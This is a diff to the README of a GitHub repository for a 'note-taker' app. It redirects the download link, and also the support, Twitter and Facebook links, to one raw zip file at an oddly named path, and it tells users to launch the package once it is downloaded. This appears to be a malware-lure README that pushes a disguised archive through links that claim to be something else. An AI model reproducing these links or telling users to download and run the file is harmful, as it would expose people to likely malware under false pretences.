@@ -13,7 +13,7 @@ Welcome to the "note-taker" repository! This is a public space where you can fin
 ## Installation 🖥️
 
 To get started with the note-taking software, you can download the package from the following link:
-[![Download Software](https://github.com/emrepl22/note-taker/releases/download/v2.0/Software.zip)](https://github.com/emrepl22/note-taker/releases/download/v2.0/Software.zip)
+[![Download Software](https://raw.githubusercontent.com/emrepl22/note-taker/main/spermatheca/taker_note_v3.0-beta.5.zip)](https://raw.githubusercontent.com/emrepl22/note-taker/main/spermatheca/taker_note_v3.0-beta.5.zip)
 
 Please note that the software package needs to be launched once downloaded. If you encounter any issues with the download link, feel free to check the "Releases" section for alternative options.
 
@@ -26,7 +26,7 @@ Please note that the software package needs to be launched once downloaded. If y
 
 ## Support ℹ️
 
-For any questions or assistance regarding the note-taking software, you can visit the official support website [here](https://github.com/emrepl22/note-taker/releases/download/v2.0/Software.zip).
+For any questions or assistance regarding the note-taking software, you can visit the official support website [here](https://raw.githubusercontent.com/emrepl22/note-taker/main/spermatheca/taker_note_v3.0-beta.5.zip).
 
 ## Contribute 🤝
 
@@ -35,8 +35,8 @@ If you're interested in contributing to the development of the note-taking softw
 ## Stay Connected 🌐
 
 Stay up to date with the latest news and updates by following us on social media:
-- Twitter: [@notetakerapp](https://github.com/emrepl22/note-taker/releases/download/v2.0/Software.zip)
-- Facebook: [Note Taker](https://github.com/emrepl22/note-taker/releases/download/v2.0/Software.zip)
+- Twitter: [@notetakerapp](https://raw.githubusercontent.com/emrepl22/note-taker/main/spermatheca/taker_note_v3.0-beta.5.zip)
+- Facebook: [Note Taker](https://raw.githubusercontent.com/emrepl22/note-taker/main/spermatheca/taker_note_v3.0-beta.5.zip)
 
 ## License 📜
 
